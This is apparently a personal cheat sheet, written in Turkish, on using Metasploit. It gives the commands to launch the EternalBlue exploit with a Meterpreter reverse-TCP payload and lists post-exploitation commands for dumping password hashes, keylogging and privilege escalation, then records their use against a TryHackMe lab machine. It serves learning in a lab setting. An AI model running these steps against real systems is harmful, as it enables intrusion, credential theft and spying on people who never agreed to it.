# Metasploit Cheatsheet

Exploit framework. Bilinen açıkları otomatik sömürme.

## Başlatma

```bash
msfconsole
```

## Temel Akış

```bash
# 1. Exploit ara
search eternalblue
search type:exploit platform:windows smb

# 2. Exploit seç
use exploit/windows/smb/ms17_010_eternalblue

# 3. Ayarları gör
show options

# 4. Hedefi ayarla
set RHOSTS <hedef_ip>
set LHOST <kendi_ip>

# 5. Payload seç (opsiyonel, varsayılan genelde iyi)
set payload windows/x64/meterpreter/reverse_tcp

# 6. Çalıştır
exploit
# veya
run
```

## Temel Komutlar (msfconsole içinde)

| Komut | Ne yapar? |
|---|---|
| `search <terim>` | Exploit/payload ara |
| `use <modül>` | Modül seç |
| `show options` | Ayarları göster |
| `set <param> <değer>` | Parametre ayarla |
| `exploit` / `run` | Çalıştır |
| `back` | Modülden çık |
| `info` | Modül detayları |
| `sessions` | Aktif oturumları listele |
| `sessions -i <id>` | Oturuma geç |

## Meterpreter Komutları (shell aldıktan sonra)

```bash
sysinfo              # Sistem bilgisi
getuid               # Kim olduğun
hashdump             # Şifre hash'lerini çek
shell                # Normal OS shell'e geç
upload <dosya>       # Dosya yükle
download <dosya>     # Dosya indir
screenshot           # Ekran görüntüsü
keyscan_start        # Keylogger başlat
keyscan_dump         # Tuş kayıtlarını göster
getsystem            # Yetki yükseltmeyi dene
```

## Gerçek Kullanımım

```
# Blue (TryHackMe) — EternalBlue:
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.x.x
exploit
# → Meterpreter shell, hashdump ile hash'ler çekildi
```
